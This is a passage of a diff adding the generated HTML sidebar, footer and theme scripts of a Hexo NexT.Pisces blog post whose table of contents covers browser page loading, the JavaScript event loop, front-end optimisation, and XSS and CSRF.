class="nav-text">优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95-1"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">扩展</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E8%B5%B7HTTP%E8%AF%B7%E6%B1%82"><span class="nav-number">1.3.</span> <span class="nav-text">发起HTTP请求</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95-2"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">扩展</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E5%8F%97%E5%93%8D%E5%BA%94%E7%BB%93%E6%9E%9C"><span class="nav-number">1.4.</span> <span class="nav-text">接受响应结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E5%87%BA%E7%BC%93%E5%AD%98%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.4.1.</span> <span class="nav-text">扩展出缓存相关问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90html%E3%80%81%E5%B8%83%E5%B1%80%E3%80%81%E6%B8%B2%E6%9F%93"><span class="nav-number">1.5.</span> <span class="nav-text">浏览器解析html、布局、渲染</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%98%E5%8C%96-2"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95-3"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">扩展</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E5%87%BAjs%E5%8D%95%E7%BA%BF%E7%A8%8B%E9%97%AE%E9%A2%98"><span class="nav-number">1.5.1.</span> <span class="nav-text">扩展出js单线程问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#js%E5%8D%95%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%A0%88%E3%80%81%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">js单线程执行栈、任务队列模型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">浏览器多线程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setInterval-setTimeout"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">setInterval setTimeout</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%98%BB%E5%A1%9Ejs%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">非阻塞js实现</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96%E7%BB%BC%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">前端优化综述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%AE%89%E5%85%A8"><span class="nav-number">3.</span> <span class="nav-text">web安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">3.1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">3.2.</span> <span class="nav-text">CSRF</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">taoyingsong</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">taoyingsong</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '',
+      clientSecret: '',
+      repo        : '',
+      owner       : '',
+      admin       : [''],
+      id          : '625c1a61e56b51b53c9554d8542537ba',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
